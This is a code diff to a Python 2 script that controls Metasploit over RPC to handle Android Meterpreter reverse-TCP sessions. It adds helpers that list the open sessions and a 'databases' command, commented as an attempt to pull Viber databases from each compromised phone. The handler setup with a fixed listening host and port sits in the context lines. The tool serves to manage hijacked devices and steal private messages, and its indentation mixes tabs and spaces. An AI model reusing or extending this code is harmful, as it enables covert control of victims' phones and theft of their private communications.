@@ -130,7 +130,22 @@ class Main:
                 print '[-] Invalid selection, please try again.'
                 time.sleep(1)
                 self.menu_actions['main_menu'](self)
+    
+    # wait for a response
+    def wait_response(self, command):
+    	self.msfconsole.clr_response()
+    	self.msfconsole.exec_command(command)
+    	while True:
+        	if self.msfconsole.get_response():
+            		break
+        return self.msfconsole.get_response()
 
+    # get sessions
+    def get_sessions(self):
+      	outfile = open('list.txt','w')
+        outfile.writelines(self.wait_response("sessions"))
+        outfile.close()
+    
     # Main Menu
     def main_menu(self):
         try:
@@ -157,9 +172,13 @@ class Main:
             if command == "quit":
                 self.msfconsole.disconnect()
                 sys.exit()
+
+            # return last session
             if command == "n":
                 print self.msfconsole.get_response()
                 self.exec_menu('main_menu')
+
+            # start msf server and enter again
             if command == "server":
                 command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444"
                 self.msfconsole.exec_command(command)
@@ -178,17 +197,26 @@ class Main:
 					# Go to main menu
         			command = ""
             
+            # get all survive sessions
             if command == "sessions":
-            		self.msfconsole.clr_response()
-            		self.msfconsole.exec_command(command)
-            		outfile = open('list.txt','w')
-            		while True:
-            			if self.msfconsole.get_response():
-            				break
-            		outfile.writelines(self.msfconsole.get_response())
-            		command = ""
-            		outfile.close()
+            	self.get_sessions()
+            	command = ""
                 
+            # try to get viber databases
+            if command == "databases":
+            	self.get_sessions()
+            	infile = open('list.txt','r')
+		for i in range(6):
+			infile.readline()
+
+		while True:
+			str = ""
+			str = infile.readline()
+			if len(str.split()) < 1:
+				break
+			tmpstr = self.wait_response("sessions " + str.split()[0])
+			self.wait_response("background")
+
             # If command not empty send it to msfrpcd
             if command:
                 self.msfconsole.exec_command(command)
